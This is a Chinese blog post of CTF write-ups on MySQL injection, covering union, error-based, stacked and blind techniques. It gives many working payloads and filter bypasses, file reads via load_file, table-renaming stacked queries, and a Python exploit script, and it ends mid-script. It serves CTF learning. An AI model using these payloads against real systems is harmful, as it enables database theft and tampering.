xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题</span></a><a class="tag-item" href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">SQL注入</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc"><strong>group_concat</strong>()</a></p>
<p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p>
<p>查数据库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(schema_name) from information_schema.schemata ;#</code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(table_name) from information_schema.tables;#</code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(column_name) from information_schema.columns;#</code></pre>

<p>最后password对应的表名应该是前面查询表名最后一个</p>
<p>查l0ve1ysq1表最后一列的字段内容：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(password) from l0ve1ysq1;#</code></pre>

<p>最终得到flag</p>
<h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p>
<p>详细见CSDN上大佬的<a target="_blank" rel="noopener" href="https://blog.csdn.net/whoim_i/article/details/102869687">文章</a>，另外附上文章的HTML文档</p>
<p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; uniunionon seselectlect null,null,group_concat(schema_name) frfromom infoorrmation_schema.schemata ;#</code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(table_name) frfromom infoorrmation_schema.tables;#</code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(column_name) frfromom infoorrmation_schema.columns;#</code></pre>

<p>查字段，反复尝试后发现flag在表b4bsql中的password列</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(passwoorrd) frfromom b4bsql;#</code></pre>

<p>得到flag</p>
<h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p>
<p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p>
<p>登录后可申请发布广告</p>
<p>广告申请界面：</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" loading="lazy">

<p>随便申请一个后首页显示：</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" loading="lazy">

<p>广告详情：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt loading="lazy"></p>
<p>在广告申请界面测试后发现存在SQL注入</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt loading="lazy"></p>
<p>配合union查询查列数：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<p>或</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</code></pre>

<blockquote>
<p>注：</p>
<ul>
<li>过滤了–+和#，故闭合最后的单引号</li>
<li>过滤了空格用/**/分离参数</li>
</ul>
</blockquote>
<p>有22列，由广告详情界面显示可知，第2,3列可注入</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt loading="lazy"></p>
<p>查数据库库，数据库版本</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<blockquote>
<p>注：</p>
<ul>
<li>此处利用无列名注入</li>
<li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li>
<li>参考：<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">官方文档</a></li>
<li>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></li>
<li>参考：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt loading="lazy"></p>
<p>查列</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<blockquote>
<p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p>
</blockquote>
<p>列数错误时：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt loading="lazy"></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt loading="lazy"></p>
<p>然后再配合无列名注入注出user表中的flag</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt loading="lazy"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p>
<p>经过测试发现过滤了：空格，=，order by，union，and</p>
<p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(database())))));#查当前数据库</code></pre>

<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(schema_name))from(information_schema.schemata))));#查所有数据库</code></pre>

<p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p>
<p>查表（like代替=进行查询）：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;))));#查geek数据库下的表</code></pre>

<p>查列：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#39;H4rDsq1&#39;))));#</code></pre>

<p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(left(password,30))from(H4rDsq1))));#查左边

1&#39;^extractvalue(1,concat(1,(select(right(password,30))from(H4rDsq1))));#查右边</code></pre>

<h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p>直接看关键代码，change.php中：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
require_once &quot;config.php&quot;;
if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
&#123;
    $msg &#x3D; &#39;&#39;;
    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;
    $user_name &#x3D; $_POST[&quot;user_name&quot;];
    $address &#x3D; addslashes($_POST[&quot;address&quot;]);
    $phone &#x3D; $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
        $msg &#x3D; &#39;no sql inject!&#39;;
    &#125;else&#123;
        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;
        $fetch &#x3D; $db-&gt;query($sql);
    &#125;

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
        $row &#x3D; $fetch-&gt;fetch_assoc();
        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];
        $result &#x3D; $db-&gt;query($sql);
        if(!$result) &#123;
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        &#125;
        $msg &#x3D; &quot;订单修改成功&quot;;
    &#125; else &#123;
        $msg &#x3D; &quot;未找到订单!&quot;;
    &#125;
&#125;else &#123;
    $msg &#x3D; &quot;信息不全&quot;;
&#125;
?&gt;</code></pre>

<p><code>address</code>并没有过滤黑名单，只使用了一个<code>addslashes</code>函数限制，在update的时候，直接将<code>address</code>取出来将其置为<code>old_address</code>，造成二次注入，并且后面有<code>print_r($db-&gt;error);</code>将报错信息打印出来，于是利用报错注入，payload如下：</p>
<pre class="language-none"><code class="language-none">POST &#x2F;change.php HTTP&#x2F;1.1
Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cn

user_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#



POST &#x2F;change.php HTTP&#x2F;1.1
Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cn

user_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</code></pre>

<h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>打开题目发现有登录注册两个界面</p>
<p>注册界面的username过滤了一些关键字，空格，and，or等</p>
<p>注册一个用户进去后有一个修改密码的功能，尝试注册<code>admin\</code>用户，再登录后修改密码，发现有sql语法报错，于是想到二次注入和爆错注入</p>
<p>payload：<code>admin&quot;||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;)))))))#</code></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20201020140803308.png" alt loading="lazy"></p>
<p>exp：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;5b2274a0-d780-4303-be2b-eb6066366015.node3.buuoj.cn&#x2F;&quot;
payload1 &#x3D; &#39;&#39;&#39;Extrader&quot;||(extractvalue(1,concat(1,((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;))))))#&#39;&#39;&#39;
payload2 &#x3D; &#39;&#39;&#39;Extrader&quot;||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;)))))))#&#39;&#39;&#39;
r &#x3D; requests.session()


def reg(payload):
    data &#x3D; &#123;
        &quot;username&quot;: payload,
        &quot;password&quot;: 123456,
        &quot;email&quot;: &quot;Extrader&quot;
    &#125;
    r.post(url&#x3D;url + &quot;register.php&quot;, data&#x3D;data)


def log(payload):
    data &#x3D; &#123;
        &quot;username&quot;: payload,
        &quot;password&quot;: 123456,
    &#125;
    r.post(url&#x3D;url + &quot;login.php&quot;, data&#x3D;data)


def chapwd():
    data &#x3D; &#123;
        &#39;oldpass&#39;: 123456,
        &#39;newpass&#39;: 123456,
    &#125;
    e &#x3D; r.post(url&#x3D;url + &quot;changepwd.php&quot;, data&#x3D;data)
    print(e.text)


if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    reg(payload1)
    log(payload1)
    chapwd()
    reg(payload2)
    log(payload2)
    chapwd()</code></pre>

<p>需要注意flag不在flag表中，在users表中，报错回显有长度限制，过滤了left和right，利用<code>reverse</code>将结果逆序输出可得到flag</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p>
<p>不过这题过滤的东西要多一些，常用的两种方法：</p>
<blockquote>
<p>预编译注入绕过关键词：set、prepare</p>
<p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p>
</blockquote>
<p>都被过滤用不了了</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt loading="lazy"></p>
<p>这里就用到了mysq的新特性<code>handler</code>，<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">详</a></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;handler FlagHere open as cool;handler cool read first;handler cool read next;#</code></pre>

<p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt loading="lazy"></p>
<h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p>
<ul>
<li>堆叠注入</li>
<li>*的使用</li>
<li>sql_mode 的应用</li>
</ul>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt loading="lazy"></p>
<p>听说比赛的时候泄露了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    session_start();

    include_once &quot;config.php&quot;;

    $post &#x3D; array();
    $get &#x3D; array();
    global $MysqlLink;

    &#x2F;&#x2F;GetPara();
    $MysqlLink &#x3D; mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
    if(!$MysqlLink)&#123;
        die(&quot;Mysql Connect Error!&quot;);
    &#125;
    $selectDB &#x3D; mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB)&#123;
        die(&quot;Choose Database Error!&quot;);
    &#125;

    foreach ($_POST as $k&#x3D;&gt;$v)&#123;
        if(!empty($v)&amp;&amp;is_string($v))&#123;
            $post[$k] &#x3D; trim(addslashes($v));
        &#125;
    &#125;
    foreach ($_GET as $k&#x3D;&gt;$v)&#123;
        &#125;
    &#125;
    &#x2F;&#x2F;die();
    ?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;&#x2F;head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;
&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;
&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;
&lt;input type&#x3D;&quot;submit&quot;&gt;
&lt;&#x2F;form&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php

    if(isset($post[&#39;query&#39;]))&#123;
        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));
        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;
            &#x2F;&#x2F;echo $post[&#39;query&#39;];
            die(&quot;Nonono.&quot;);
        &#125;
        if(strlen($post[&#39;query&#39;])&gt;40)&#123;
            die(&quot;Too long.&quot;);
        &#125;
        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;
        mysqli_multi_query($MysqlLink,$sql);
        do&#123;
            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;
                while($row &#x3D; mysqli_fetch_row($res))&#123;
                    print_r($row);
                &#125;
            &#125;
        &#125;while(@mysqli_next_result($MysqlLink));

    &#125;

    ?&gt;</code></pre>

<p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p>
<p>sql_mode 是一组mysql支持的基本语法及校验规则</p>
<p><strong>mysql中sql_mode值举例：</strong> </p>
<p><strong>STRICT_TRANS_TABLES：</strong> </p>
<blockquote>
<p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p>
</blockquote>
<p><strong>STRICT_ALL_TABLES：</strong> </p>
<blockquote>
<p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p>
</blockquote>
<p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p>
<blockquote>
<p>当存储引擎被禁止或者未解析时，当使用时会报错 </p>
</blockquote>
<p><strong>only_for_group_by：</strong> </p>
<blockquote>
<p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p>
</blockquote>
<p><strong>NO_AUTO_CREATE_USER:</strong> </p>
<blockquote>
<p>禁止创建密码为空的用户 </p>
</blockquote>
<p><strong>NO_ZERO_IN_DATE：</strong> </p>
<blockquote>
<p>在严格模式下，不允许日期和月份为零 </p>
</blockquote>
<p><strong>NO_ZERO_DATE：</strong> </p>
<blockquote>
<p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p>
</blockquote>
<p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p>
<blockquote>
<p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p>
</blockquote>
<p><strong>NO_AUTO_CREATE_USER：</strong> </p>
<blockquote>
<p>禁止GRANT语句创建密码为空的用户 </p>
</blockquote>
<p><strong>PIPES_AS_CONCAT：</strong> </p>
<blockquote>
<p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p>
</blockquote>
<p><strong>ANSI_QUOTES：</strong> </p>
<blockquote>
<p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p>
</blockquote>
<p>于是有注入语句：</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</code></pre>

<p>拼合起来就是：</p>
<pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt loading="lazy"></p>
<p>另外还有一个解就是*的用法：</p>
<p>注入：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">*,1</code></pre>

<p>拼合起来就是：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre>

<p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt loading="lazy"></p>
<h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入</a></p>
<p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt loading="lazy"></p>
<p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt loading="lazy"></p>
<p>嗯，确实，一个工具有啥灵魂O.O</p>
<p>测试单引号</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt loading="lazy"></p>
<p>接着测试注释：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;--+</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt loading="lazy"></p>
<p>被过滤掉了</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;#</code></pre>

<p>#有效</p>
<p>尝试注入sql查询等语句，提示被过滤</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt loading="lazy"></p>
<p>于是就用到前面提到了堆叠注入</p>
<p>首先列出所有数据库：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show databases;#         显示如下</code></pre>

<p>列出所有表：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show tables;#         显示如下</code></pre>

<p>列出表words中的所有列：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from words;#         显示如下</code></pre>

<p>列出表1919810931114514中所有的列：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from &#96;1919810931114514&#96;;#         显示如下</code></pre>

<p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p>
<p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p>
<p>这题没有禁用rename和alter</p>
<p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
<blockquote>
<p>rename用来修改表名</p>
<p>用法rename命令格式：rename table 原表名 to 新表名;</p>
</blockquote>
<blockquote>
<p>alter用来删除，添加或修改表字段</p>
<p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p>
</blockquote>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</code></pre>


<p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</code></pre>


<p>最终得到flag：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt loading="lazy"></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">Smi1e</a></p>
<p>界面：</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" loading="lazy">

<p>FUZZ测试后发现</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" loading="lazy">

<p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a target="_blank" rel="noopener" href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">参考</a></p>
<p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p>
<p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p>
<p>于是写出盲注爆表脚本（Payload1）</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com&#x2F;index.php&quot;
for i in range(1,100):
    for j in range(40,128):
        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;
